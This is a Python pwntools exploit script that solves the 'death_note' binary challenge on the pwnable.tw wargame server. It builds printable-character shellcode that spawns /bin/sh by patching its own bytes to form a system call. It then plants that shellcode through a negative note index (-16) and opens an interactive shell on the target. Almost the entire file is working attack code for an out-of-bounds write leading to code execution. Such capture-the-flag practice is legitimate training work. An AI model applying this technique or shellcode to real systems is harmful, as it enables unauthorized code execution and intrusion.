#!/usr/bin/env python2
from pwn import *

exe = ELF("./death_note")
context.binary = exe
context.terminal = "kitty sh -c".split()
#context.log_level = "debug"
IP, PORT = "chall.pwnable.tw", 10201

global io
breakpoints = '''
break *0x80487ea
continue
'''
if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(IP, PORT)
elif len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(exe.path)
else:
    io = gdb.debug(exe.path, gdbscript=breakpoints)


def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sl(a): return io.sendline(a)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def reu(a): return io.recvuntil(a)
def rl(): return io.recvline(False)

def add_note(offset,payload):
    reu(" :")
    s("1")
    reu(" :")
    s(str(offset))
    reu(" :")
    sl(payload)

def is_printable(shellcode):
    for i in range(len(shellcode)):
        if ord(shellcode[i]) < 0x1f or ord(shellcode[i]) > 0x7f:
            return False
    return True

shellcode = asm('''

push 0x68
push 0x732f2f2f
push 0x6e69622f
push esp
pop ebx

push edx
pop eax
push 0x53
pop edx
sub byte ptr [eax+39],dl
sub byte ptr [eax+40],dl
push 0x70
pop edx
xor byte ptr [eax+40],dl

push ecx
pop eax
push ecx
pop edx
xor al,43
xor al,32

''')+"\x20\x43"

assert is_printable(shellcode)

add_note(-16,shellcode)

io.interactive()
